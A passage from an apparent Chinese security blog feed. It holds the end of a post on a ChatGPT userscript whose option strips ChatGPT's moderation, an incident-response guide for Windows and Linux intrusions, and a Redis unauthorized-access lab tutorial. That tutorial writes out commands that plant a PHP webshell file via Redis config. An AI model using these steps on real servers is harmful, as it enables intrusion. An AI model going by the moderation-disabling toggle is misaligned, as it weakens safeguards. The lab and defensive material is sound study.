src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145144661.png" alt="Tampermonkey成功安装"></p><ul><li>安装<strong>KeepChatGPT</strong></li></ul><p>插件安装成功后，打开 KeepChatGPT 脚本地址：<a href="https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt">https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt</a></p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145332001.png" alt="点击安装KeepChatGPT"></p><p>安装完成后打开<a href="https://chat.openai.com/">https://chat.openai.com/</a></p><p>就能看到左上角出现 KeepChatGPT 的图标，则代表该插件已安装成功。</p><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145526977.png" alt=" KeepChatGPT安装成功"></p><h4 id="5-1-2-基本使用"><a href="#5-1-2-基本使用" class="headerlink" title="5.1.2 基本使用"></a>5.1.2 基本使用</h4><p>把鼠标移动到图标上，会出现 3 个选项。</p><ul><li><p><code>显示调试</code>：主要用于观测脚本的运行过程；</p></li><li><p><code>暗色主题</code>：用于图标的颜色切换；</p></li><li><p><code>取消审计</code>：让 ChatGPT 输出更多丰富的内容，尺度较大</p></li></ul><p><img src="/../img/chatgpt%E5%8F%8A%E5%85%B6%E5%A4%A7%E8%AF%AD%E8%A8%80%E6%A8%A1%E5%9E%8B(LLM)%E5%BA%94%E7%94%A8/image-20230422145741676.png" alt="基本功能"></p><p>到此，KeepChatGPT就能正常使用了，解决掉因为网络导致 ChatGPT 报错这个问题。</p><h2 id="6-后续"><a href="#6-后续" class="headerlink" title="6. 后续"></a>6. 后续</h2><p>后续会不定期更新一些非常不错的AI相关的应用，以及chatgpt相关插件、AIGC相关的内容。</p><h2 id="7-参考来源"><a href="#7-参考来源" class="headerlink" title="7. 参考来源"></a>7. 参考来源</h2><ol><li><a href="https://chat.openai.com/">https://chat.openai.com</a></li><li><a href="https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg">https://mp.weixin.qq.com/s/QB85YPjh6DMBTPla4NDfXg</a></li><li><a href="https://www.anthropic.com/claude-in-slack">https://www.anthropic.com/claude-in-slack</a></li><li><a href="https://vercel.com/">https://vercel.com/</a></li><li><a href="https://huggingface.co/">https://huggingface.co</a></li><li><a href="https://github.com/ConnectAI-E/Feishu-OpenAI">https://github.com/ConnectAI-E/Feishu-OpenAI</a></li><li><a href="https://mp.weixin.qq.com/s/LPB4X99pV7KuExWHcBqugA">https://mp.weixin.qq.com/s/LPB4X99pV7KuExWHcBqugA</a></li><li><a href="https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt">https://greasyfork.org/zh-CN/scripts/462804-keepchatgpt</a></li><li><a href="https://www.tampermonkey.net/">https://www.tampermonkey.net/</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>chatgpt LLM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>应急响应初探</title>
    <link href="/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/04/20/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a><strong>常用方法</strong></h2><ul><li>三要素法：时间、地点、事件</li><li>回溯攻击法：尝试模拟攻击</li><li>经验法：<ul><li>攻击者常用的目录</li><li>黑客惯用手法</li><li>常见恶意程序特征</li></ul></li></ul><h2 id="应急响应阶段"><a href="#应急响应阶段" class="headerlink" title="应急响应阶段"></a>应急响应阶段</h2><p>检测阶段→抑制阶段→根除阶段→恢复阶段→溯源阶段</p><h2 id="应急排查点"><a href="#应急排查点" class="headerlink" title="应急排查点"></a>应急排查点</h2><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/1.png" alt="应急排查点"></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h2><h3 id="登录记录"><a href="#登录记录" class="headerlink" title="登录记录"></a>登录记录</h3><ol><li>命令输入: gpedit.msc  </li><li>“计算机配置”→“Windows设置”→“安全设置”→“本地策略”→“审核策略”，双击其中的“审核帐户登陆事件”&#x3D;&#x3D;&gt;审核登录事件–&gt;勾上成功&#x2F;失败–&gt;点击应用–&gt;点击确定</li><li>控制面板–&gt;系统和安全–&gt;查看事件日志–&gt;事件查看器–&gt;windows日志–&gt;安全，便可以看到用户的登录和注销以及账户名等信息</li></ol><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><ul><li>基本信息：</li></ul><p>msinfo32、systeminfo</p><ul><li>启动项：</li></ul><ol><li>msconfig</li><li>注册表：Run键值、RunOnce键值、RunServicesOnce健值、RunServices健值、RunOneceEx键值（windows xp&#x2F;2003特有）、load健值、Winlogon健值<ol><li>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</li></ol></li></ol><ul><li>计划任务：<ol><li>compmgmt.msc（计算机管理）下计划任务</li><li>Powershell使用Get-ScheduledTask</li><li>schtasks命令</li></ol></li></ul><h3 id="文件痕迹排查"><a href="#文件痕迹排查" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h3><ul><li>敏感目录<ul><li>%WINDIR%</li><li>%WINDIR%\system32\</li><li>%TEMP%</li><li>%LOCALAPPDATA%</li><li>%APPDATA% </li><li>各个盘下的temp（tmp）相关目录下查看有无异常文件</li></ul></li><li>特定时间段的文件情况排查<ul><li>查看文件时间，创建时间，修改的时间，访问时间</li><li>对应的linuxd的ctime,mtime,atime</li><li>查看用户的recent相关文件，通过分析最近打开分析可疑文件<ul><li>C:\Documents and Settings\Administrator\Recent</li><li>C:\Documents and Settings\Default User\Recent</li><li>开始，运行 %UserProfile%\Recent</li></ul></li><li>根据文件夹内文件列表时间进行排序，查找可疑文件。也可以搜索指定时间范围内的文件和文件夹</li></ul></li><li>后门文件的排查</li></ul><h3 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h3><ul><li>通过任务管理器进行查看<ul><li>映像路径名称</li><li>命令行</li></ul></li><li>tasklist命令<ul><li>tasklist &#x2F;svc    可以显示每个进程和服务的对应情况</li><li>对于某些加载dll的恶意进程，可以通过&#x2F;m参数进行查询。对于要查询特定dll的调用情况，可以使用命令tasklist  &#x2F;m dll 名称</li></ul></li></ul><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/2.png" alt="tasklist命令"></p><ul><li>netstat命令<ul><li>在排查过程中，一般会使用netstat -ano | findstr “ESTABLISHED” 查看目前的网络连接，定位可疑的ESTABLISHED。根据netstat 定位出的pid，再通过tasklist命令进行程序定位</li></ul></li><li>powershell命令<ul><li>Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path</li></ul></li><li>wmic命令进行查询<ul><li>wmic process where name&#x3D;’powershell.exe’ get caption,commadnline,processid,parentprocessid &#x2F;value</li></ul></li></ul><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><ol><li>通过内置的日志筛选器进行分析，可以通过事件ID，关键字等对日志进行筛选</li><li>通过Powershell对日志进行分析<ol><li>通过powershell进行查询最常用到两个命令是Get-EventLog和Get-WinEvent，两者的区别是GetEventLog只获取传统的事件日志，而Get-WinEvent cmdlet 从包括传统日志（例如系统日志和应用程序日志）在内的事件日志和 Windows Vista 中引入的新 Windows 事件日志技术生成的事件日志中获取事件。</li></ol></li><li>通过相关的日志工具进行分析查询</li></ol><ul><li>主机日志<ul><li>应用程序</li><li>安全性</li><li>系统</li></ul></li><li>其他日志<ul><li>IIS日志</li><li>Apache日志</li><li>Tomcat日志</li></ul></li></ul><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="查看用户相关分析"><a href="#查看用户相关分析" class="headerlink" title="查看用户相关分析"></a>查看用户相关分析</h3><pre><code class="hljs">  1. useradd userdel 的命令时间变化（stat），以及是否包含可疑信息  2. cat /etc/passwd 分析可以账号，可登录账号</code></pre><h3 id="系统信息-1"><a href="#系统信息-1" class="headerlink" title="系统信息"></a>系统信息</h3><h4 id="查看分析history"><a href="#查看分析history" class="headerlink" title="查看分析history"></a>查看分析history</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/.bash_history<br></code></pre></td></tr></table></figure><pre><code class="hljs">  1. wget远程某主机（域名&amp;IP）的远控文件；  2. 尝试连接内网某主机（ssh scp），便于分析攻击者意图  3. 打包某敏感数据或代码，tar zip 类命令  4. 对系统进行配置，包含命令修改、远控木马类，可找到攻击者关联信息</code></pre><h4 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h4><p>启动项作为恶意病毒的一个常用的驻留手段，以下几个地方可以查找启动项相关的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/rc.local<br>/etc/rc.local<br>rc.local<br>/etc/init.d<br></code></pre></td></tr></table></figure><h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><ul><li>通过crontab -l 查看当前的任务计划有哪些，也可以指定用户进行查看<ul><li>crontab -u root -l 是root下的计划任务</li></ul></li><li>查看etc目录任务计划相关文件，一般存在计划任务的目录有以下，可以通过浏览下面的计划任务文件的方式来查看计划任务</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> /etc/cron*<br>crontab -l<br></code></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><p>使用netstat 网络连接命令，分析可疑端口、可疑IP、可疑PID及程序进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -antlp | more<br></code></pre></td></tr></table></figure><p>如下图所示，为某恶意程序的外链信息。然后根据pid，利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> –alh /proc/pid<br></code></pre></td></tr></table></figure><p>命令查看其对应的可执行程序<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/3.png" alt="ls –alh /proc/pid"><br>也可以利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsof –p pid<br></code></pre></td></tr></table></figure><p>查看pid对应的可执行程序,如果是恶意进程，可以使用kill -9（数字九） 进程的PID值命令来结束进程，如kill -9 2535，然后使用 rm -rf filename 来删除木马，如果root用户都无法删除相关文件，很可能文件被加上了i属性，使用 lsatter filename 命令来查看文件属性，然后使用chattr -i filename 命令来移除i属性继而删除文件；也有的进程因为存在守护进程而无法杀除，可以先把进程挂起，再杀掉守护进程后，再回来把进程杀掉。</p><h4 id="文件痕迹排查-1"><a href="#文件痕迹排查-1" class="headerlink" title="文件痕迹排查"></a>文件痕迹排查</h4><ul><li>时间点</li></ul><p>find: 在指定目录下查找文件<br>-type b&#x2F;d&#x2F;c&#x2F;p&#x2F;l&#x2F;f 查找是块设备、目录、字符设备、管道、符号链接、普通文件<br>-mtime -n +n 按文件更改时间来查找文件，-n 指 n天以内，+n 指 n 天前<br>-atime -n +n 按文件访问时间来查找文件，-n 指n 天以内，+n 指 n天前<br>-ctime -n +n 按文件创建时间来查找文件， -n指n天以内，+n指n天前<br>find &#x2F; -ctime 0 -name “*.sh”</p><ul><li>特殊文件</li></ul><p>查找777的权限文件 find &#x2F; *.jsp -perm 777<br>webshell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/4.png" alt="webshell"><br>查看目标系统命令的修改时间：ls -alt &#x2F;bin</p><h4 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h4><p><strong>var&#x2F;log下的具体功能</strong></p><ul><li>&#x2F;var&#x2F;log&#x2F;wtmp 登录进入，退出，数据交换、关机和重启记录</li><li>&#x2F;var&#x2F;log&#x2F;lastlog 文件记录用户最后登录的信息</li><li>&#x2F;var&#x2F;log&#x2F;secure 记录登入系统存取数据的文件，如 pop3&#x2F;ssh&#x2F;telnet&#x2F;ftp</li><li>&#x2F;var&#x2F;log&#x2F;cron 与定时任务相关的日志信息，记录crontab命令是否被正确的执行</li><li>&#x2F;var&#x2F;log&#x2F;message 系统启动后的信息和错误日志</li><li>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log apache的访问日志</li><li>&#x2F;var&#x2F;log&#x2F;auth.log 包含系统授权信息，包括用户登录和使用的权限机制等</li><li>&#x2F;val&#x2F;log&#x2F;userlog 记录所有登记用户的信息日志</li><li>&#x2F;var&#x2F;log&#x2F;xferlog(vsftp.log)记录linux FTP日志</li><li>&#x2F;var&#x2F;log&#x2F;history 用户登录时间IP为名字的文件, 内容为用户执行命令的日志信息</li><li>&#x2F;var&#x2F;log&#x2F;faillog 记录登录系统不成功的账号信息</li></ul><p><strong>另外</strong></p><pre><code class="hljs">  - last 为登陆成功日志  - lastb为登录失败，可查看是否爆破  - stat 查看日志创建时间  - 如果怀疑某个文件为木马控制端，可直接对文件进行调试查看传递信息</code></pre><p>strace -p pid #调试进程</p><pre><code class="hljs">  - history 或 cat ~/.bash_history 查看历史命令，查找痕迹</code></pre><p><strong>入侵者可能会删除机器的日志信息，可以查看日志信息是否还存在或者是否被清空，相关命令示例：</strong><br>root@ahuan:~# ll -h &#x2F;var&#x2F;log&#x2F;*<br>-rw-r–r–  1 root      root               0 Mar  1 06:25 &#x2F;var&#x2F;log&#x2F;alternatives.log<br>-rw-r–r–  1 root      root             283 Feb 25 09:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.1<br>-rw-r–r–  1 root      root             214 Feb 18 11:57 &#x2F;var&#x2F;log&#x2F;alternatives.log.2.gz<br>-rw-r–r–  1 root      root             477 Dec 20 23:29 &#x2F;var&#x2F;log&#x2F;alternatives.log.3.gz<br>-rw-r–r–  1 root      root            2.0K Nov 30 22:56 &#x2F;var&#x2F;log&#x2F;alternatives.log.4.gz</p><h4 id="恶意流量"><a href="#恶意流量" class="headerlink" title="恶意流量"></a>恶意流量</h4><p>netstat -anlpt 查看是否存在恶意流量（通过威胁情报进行判定是否为恶意域名）<br>查找对应流量连接位置<br>ls -al &#x2F;proc&#x2F;PID (根据查到pid进程输入)</p><p>如 ls -al &#x2F;proc&#x2F;791<br>exe -&gt; 指向启动当前进程的可执行文件（完整路径）的符号链接</p><h2 id="web漏洞应急篇"><a href="#web漏洞应急篇" class="headerlink" title="web漏洞应急篇"></a>web漏洞应急篇</h2><h2 id="Apache-Shiro攻击"><a href="#Apache-Shiro攻击" class="headerlink" title="Apache Shiro攻击"></a>Apache Shiro攻击</h2><p>特征rememberMe<br>恶意 Cookie rememberMe值构造<br>前16字节的密钥 -&gt; 后面加入序列化参数 -&gt; AES加密 -&gt; base64编码 -&gt; 发送cookie</p><p>Apache Shiro处理cookie的流程<br>得到rememberMe的cookie值 -&gt; Base64解码 -&gt; AES-128-CBC解密-&gt; 反序列化(readobject)</p><p><strong>应急流程</strong><br>设备查看告警信息，对remeberMe进行解密，查看反弹IP&#x2F;域名进行进一步溯源，<br>reneberMe管理代码中写道cookie加密密钥默认为AES算法，可以将黑客常用的攻击密钥做一个keylist进行解密，直接在解密内容里查看payload。</p><p>排查思路，该漏洞都是通过remeberMe进行传入payload，直接对日志shiro进行反编译即可查到相关信息（vps、未公开的利用链，特殊的payload）</p><h2 id="Weblogic攻击"><a href="#Weblogic攻击" class="headerlink" title="Weblogic攻击"></a>Weblogic攻击</h2><p>流量层：可以直接查看到访问地址数据包内payload<br>如CVE-2020-2551(iiop)漏洞主要是通过 JtaTransactionManager 来进行加载 LDAP 协议的内容<br><strong>在日志里显示：</strong><br>Weblogic日志主要分为：Server日志、HTTP日志和DOMAIN日志；</p><p>1、Server日志<br>主要功能：记录Weblogic Server启动至关闭过程中的运行信息和错误信息。<br>日志结构：时间戳、严重程度、子系统、计算机名、服务器名、线程 ID、用户 ID、事务 ID、诊断上下文 ID、原始时间值、消息 ID 和消息文本。<br>2、DOMAIN日志<br>主要功能：记录一个DOMAIN下的各个Weblogic Server的启动至关闭过程中的运行信息和错误信息。<br>日志结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">####<span class="hljs-tag">&lt;<span class="hljs-name">Oct</span> <span class="hljs-attr">18</span>, <span class="hljs-attr">2018</span> <span class="hljs-attr">2:21:11</span> <span class="hljs-attr">PM</span> <span class="hljs-attr">CST</span>&gt;</span>     &lt;[ACTIVE]ExecuteThread: &#x27;9&#x27; for queue: &#x27;weblogic.kernel.Default (self-tuning)&#x27;&gt; <span class="hljs-tag">&lt;&gt;</span> <span class="hljs-tag">&lt;&gt;</span> <span class="hljs-tag">&lt;&gt;</span> &lt;1539843671288&gt;  <br></code></pre></td></tr></table></figure><p>iiop协议不会在http请求中有记录，应急主要注意domain日志的记录</p><p>应急流程：<br><strong>t3协议</strong><br>临时处置方式：<br>1.及时更新补丁<br>2.禁用T3协议<br>3.禁止T3端口对外开放, 或者限制可访问T3端口的IP来源<br>漏洞列表：<br>CVE-2017-3248<br>CVE-2018-2628<br>CVE-2018-2893<br>CVE-2019-2890<br>CVE-2020-2555<br><strong>iiop协议</strong><br>临时处置：<br>1.及时更新补丁<br>2.通过 Weblogic 控制台进行关闭 IIOP 协议<br>漏洞列表：<br>CVE-2020-2551</p><h2 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h2><p>1.写webshell<br>2.写ssh密钥<br>3.写计划任务反弹shell</p><h3 id="应急流程："><a href="#应急流程：" class="headerlink" title="应急流程："></a>应急流程：</h3><p>查看配置信息是否存在异常（根据显示信息可判断是哪种攻击方式）<br>config get *<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/5.png" alt="config get *"><br>写ssh密钥<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/6.png" alt="写ssh密钥"><br>反弹shell<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/7.png" alt="反弹shell"><br>写文件路径<br>查看key信息是否有攻击队特征信息<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="查看key信息是否有攻击队特征信息"><br>如果发现攻击队正在操作redis，可以使用 monitor命令进行检测<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/8.png" alt="monitor命令进行检测"></p><h2 id="冰蝎与内存马攻击"><a href="#冰蝎与内存马攻击" class="headerlink" title="冰蝎与内存马攻击"></a>冰蝎与内存马攻击</h2><ul><li>冰蝎</li></ul><p>特征：后缀为动态脚本（jsp、asp、php） 请求体加密状态</p><ul><li>内存马</li></ul><p>攻击特征：没有落地文件通常以 <a href="http://url.com/xxx/">http://url.com/xxx/</a> (直接以某个文件夹为路径)<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/10.png" alt="内存马"><br><strong>应急思路</strong><br>针对webshell，可直接对web路径下查找动态脚本文件，也可以直接搜索文件内特征值<br><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/11.png" alt="find / -name *.jsp*"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> / -name *.jsp | xargs <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;pass&quot;</span><br></code></pre></td></tr></table></figure><p>（pass为特征值，可以修改。如果返回内容过多可自行修改特征）</p><p><img src="/../img/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%9D%E6%8E%A2/12.png" alt="pass特征"><br>对于内存马，虽然现在有各种文章分析如何提取，但最简单的方法还是重启解决问题。<br>如果想知道如何手动清理，请移步至：<br><a href="https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247485680&idx=1&sn=bbd2bd94da7720c6567c462c8559cfdd&scene=21#wechat_redirect">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a><br>修复建议：<br>1.根据漏洞来定，如果是程序漏洞修复即可<br>2.上传漏洞，禁止上传动态脚本文件，采用白名单机制仅允许特定后缀上传</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ">https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ</a></li><li><a href="https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g">https://mp.weixin.qq.com/s/w3c7tKfj1Plcbv57Gz8M0g</a></li><li><a href="https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw">https://mp.weixin.qq.com/s/f38CmhZCXPvz5P-c17z-Bw</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis未授权访问初探</title>
    <link href="/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/"/>
    <url>/2023/04/20/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="一、简介和危害"><a href="#一、简介和危害" class="headerlink" title="一、简介和危害"></a>一、简介和危害</h2><h3 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1. 什么是redis未授权访问漏洞"></a>1. 什么是redis未授权访问漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>漏洞产生的条件：</p><ol><li>redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</li><li>没有设置密码认证（一般为空），可以免密码远程登录redis服务。</li></ol><h3 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2 漏洞危害"></a>2 漏洞危害</h3><ol><li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据； </li><li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件； </li><li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</li></ol><h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><ul><li>漏洞环境<ul><li>靶机ip：192.168.0.110</li><li>攻击机ip：192.168.0.111</li></ul></li></ul><p>使用命令启动redis服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-server /etc/redis-conf<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis1.png"></p><p>启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis2.png"><br /> </p><h3 id="3-基础命令"><a href="#3-基础命令" class="headerlink" title="3. 基础命令"></a>3. 基础命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#连接redis</span><br><br>redis-cli -h ip -p 6379 -a passwd<br><br><span class="hljs-comment">#查看redis版本信息等</span><br><br>info<br><br><span class="hljs-comment">#列出当前数据库中所有的键</span><br><br>keys *<br><br><span class="hljs-comment"># 删除所有数据(谨慎使用)</span><br><br>flushall<br><br><span class="hljs-comment"># 设置主从关系</span><br><br>slaveof ip port<br><br><span class="hljs-comment">#设置一个键的值</span><br><br>SET key value<br><br><span class="hljs-comment">#获取一个建的值</span><br><br>GET key <br></code></pre></td></tr></table></figure><h3 id="4-未授权访问复现"><a href="#4-未授权访问复现" class="headerlink" title="4. 未授权访问复现"></a>4. 未授权访问复现</h3><p>使用redis客户端直接无账号成功登录redis：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis3.png"><br />从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p><h4 id="4-1-利用redis写webshell"><a href="#4-1-利用redis写webshell" class="headerlink" title="4.1 利用redis写webshell"></a>4.1 利用redis写webshell</h4><p><strong>利用前提</strong>：</p><ol><li>靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</li><li>开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</li></ol><p>这里由于本地搭建，我们已经知道目录，我们把shell写入&#x2F;home&#x2F;ali目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /home/ali<br>config <span class="hljs-built_in">set</span> dbfilename redis.php<br><span class="hljs-built_in">set</span> wenshell <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis4.png"></p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis5.png"></p><p>因为直接这样写会乱码。所以改良一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span><br></code></pre></td></tr></table></figure><p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。<br />shell写入完成，在靶机上来证明：<br />写入webshell<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis6.png"><br />查看shell.php<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis7.png"><br />当数据库过大时，redis写shell的小技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>set_time_limit(0);<br><span 